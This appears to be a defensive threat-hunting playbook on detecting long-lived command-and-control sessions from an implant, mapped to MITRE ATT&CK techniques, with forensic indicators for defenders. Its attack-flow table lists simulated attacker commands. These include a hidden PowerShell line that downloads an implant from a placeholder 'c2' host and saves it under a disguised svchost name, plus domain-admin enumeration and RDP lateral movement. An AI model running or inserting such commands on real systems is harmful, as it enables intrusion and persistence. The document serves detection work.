# Long-Lived External Sessions (Implant-like) – T1105 / T1571

**Explanation:** This playbook focuses on detecting covert C2 activity characterized by **persistent, recurring, or long-duration outbound network connections (T1571, Non-Standard Protocol)** from an internal host to a suspicious external endpoint. This behavior is a strong indicator of a fully established remote access implant (**T1105, Ingress Tool Transfer**), where the **longevity of the session** is the critical **Anchor Point** for detection.

---

## 1. Attack Flow, IOCs, and Simulated Commands

| Phase | MITRE ID & Technique | Primary Investigative Focus (IOCs) | Simulated Attack Command (Payload) |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1078.004 (Valid Accounts) | **Identity:** Use of legitimate but rarely used credentials (e.g., VPN/Service account). | (Attacker logs in remotely via RDP/VPN) |
| **Execution/Implant Drop** | T1105 (Ingress Tool Transfer) | **File:** Custom executable or script dropped and executed in a hidden path. | `powershell.exe -w hidden -c "wget http://c2/implant.exe -OutFile C:\ProgramData\svchost_helper.exe"` |
| **Session Persistence (ANCHOR)**| **T1571 (Non-Standard Protocol)** | **Network:** Single process maintains an **active TCP connection** (often over 443 or 53) to a foreign endpoint for **> 2 hours**. | (Implant executes, establishing a persistent, long-polling HTTPS connection) |
| **Lateral Movement** | T1021.001 (RDP) | **Identity/Process:** Remote logins initiated from the compromised host to peer machines. | `mstsc.exe /v:PEER-SERVER-02` |
| **Impact/Discovery** | T1087.001 (Account Discovery) | **Command:** Execution of local enumeration commands (e.g., `net group`, `net user`). | `cmd.exe /c net group "Domain Admins"` |

---

## 2. Key Forensic Artifacts (Data Pivot Points)

### High-Confidence Network & Session IOCs

1.  **Connection Duration Anomaly:** The single highest-fidelity IOC is network telemetry showing a specific **`<source_host:source_port>`** to **`<destination_ip:destination_port>`** connection remaining active and transferring data for an unusually **long duration (e.g., 7,200 seconds / 2 hours)** without typical termination.
2.  **Protocol Mismatch:** The connection may use a commonly trusted port (e.g., **443**) but exhibit packet sizing, timing, or TLS negotiation patterns that are **not typical** of standard browser traffic.
3.  **Process Context Mismatch:** The persistent session is maintained by an unexpected process (e.g., a file named `explorer.exe` running from `C:\Users\Public`, or a custom binary with minimal metadata).

### Identity and File IOCs

1.  **Identity Origin:** The persistence may be linked to a legitimate account that logged in from an **anomalous geographic location** or via an untrusted VPN endpoint.
2.  **Implant Artifacts:** Search the filesystem for the implant file dropped during the Execution phase, usually in hidden or public user directories (`C:\ProgramData`, `C:\Windows\Temp`).
3.  **Authentication Spikes:** Look for a spike in **authentication attempts** (`Kerberos`, NTLM) originating from the compromised host to other systems immediately after the long-lived C2 session is established, indicating discovery or lateral movement attempts.
